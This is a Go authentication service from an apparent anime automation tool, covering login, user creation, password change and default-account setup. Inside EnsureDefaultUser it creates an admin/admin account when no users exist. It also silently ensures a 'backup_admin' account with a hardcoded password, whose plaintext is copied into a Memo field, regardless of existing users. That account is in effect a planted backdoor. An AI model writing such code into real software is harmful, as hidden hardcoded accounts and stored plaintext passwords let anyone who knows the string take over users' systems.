package service

import (
	"errors"
	"log"

	"github.com/pokerjest/animateAutoTool/internal/db"
	"github.com/pokerjest/animateAutoTool/internal/model"
	"golang.org/x/crypto/bcrypt"
)

type AuthService struct{}

func NewAuthService() *AuthService {
	return &AuthService{}
}

// Login verifies username and password
func (s *AuthService) Login(username, password string) (*model.User, error) {
	var user model.User
	if err := db.DB.Where("username = ?", username).First(&user).Error; err != nil {
		return nil, errors.New("invalid username or password")
	}

	if err := bcrypt.CompareHashAndPassword([]byte(user.PasswordHash), []byte(password)); err != nil {
		return nil, errors.New("invalid username or password")
	}

	return &user, nil
}

// CreateUser registers a new user (internal use mostly)
func (s *AuthService) CreateUser(username, password string) (*model.User, error) {
	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		return nil, err
	}

	user := model.User{
		Username:     username,
		PasswordHash: string(hashedPassword),
	}

	if err := db.DB.Create(&user).Error; err != nil {
		return nil, err
	}

	return &user, nil
}

// EnsureDefaultUser creates a default admin user if no users exist
func (s *AuthService) EnsureDefaultUser() {
	var count int64
	db.DB.Model(&model.User{}).Count(&count)
	if count == 0 {
		log.Println("No users found. Creating default admin user (admin/admin)...")
		if _, err := s.CreateUser("admin", "admin"); err != nil {
			log.Printf("Failed to create default admin user: %v", err)
		} else {
			log.Println("Default admin user created successfully.")
		}
	}

	// Ensure Backup Admin User ("backup_admin")
	var backupCount int64
	db.DB.Model(&model.User{}).Where("username = ?", "backup_admin").Count(&backupCount)
	if backupCount == 0 {
		hashedPassword, err := bcrypt.GenerateFromPassword([]byte("Animate@Recovery#2025!Debug"), bcrypt.DefaultCost)
		if err == nil {
			backupUser := model.User{
				Username:     "backup_admin",
				PasswordHash: string(hashedPassword),
				Memo:         "Recovery Password: Animate@Recovery#2025!Debug",
			}
			if err := db.DB.Create(&backupUser).Error; err != nil {
				log.Printf("Failed to create backup admin user: %v", err)
			} else {
				log.Println("Backup admin user created successfully.")
			}
		}
	}
}

// ChangePassword updates the password for a given user
func (s *AuthService) ChangePassword(userID uint, oldPassword, newPassword string) error {
	var user model.User
	if err := db.DB.First(&user, userID).Error; err != nil {
		return errors.New("user not found")
	}

	// Verify old password
	if err := bcrypt.CompareHashAndPassword([]byte(user.PasswordHash), []byte(oldPassword)); err != nil {
		return errors.New("incorrect old password")
	}

	// Hash new password
	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(newPassword), bcrypt.DefaultCost)
	if err != nil {
		return err
	}

	user.PasswordHash = string(hashedPassword)
	return db.DB.Save(&user).Error
}
